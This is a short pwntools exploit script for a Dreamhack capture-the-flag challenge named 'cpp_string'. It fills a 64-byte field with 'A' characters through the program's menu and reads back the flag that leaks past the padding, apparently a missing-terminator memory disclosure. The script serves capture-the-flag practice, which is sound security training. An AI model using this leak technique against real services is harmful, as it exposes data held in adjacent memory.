#!/usr/bin/env python3
from pwn import *

PORT = 22559
HOST = "host8.dreamhack.games"
elf = context.binary = ELF('./cpp_string', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

pl = b'A'*64
p.sendlineafter(b"input : ", b'2')
p.sendlineafter(b"contents : ", pl)
p.sendlineafter(b"input : ", b'1')
p.sendlineafter(b"input : ", b'3')

p.recvuntil(pl)
flag = p.recvline()[:-1]

print("flag: "  + flag.decode())


p.interactive()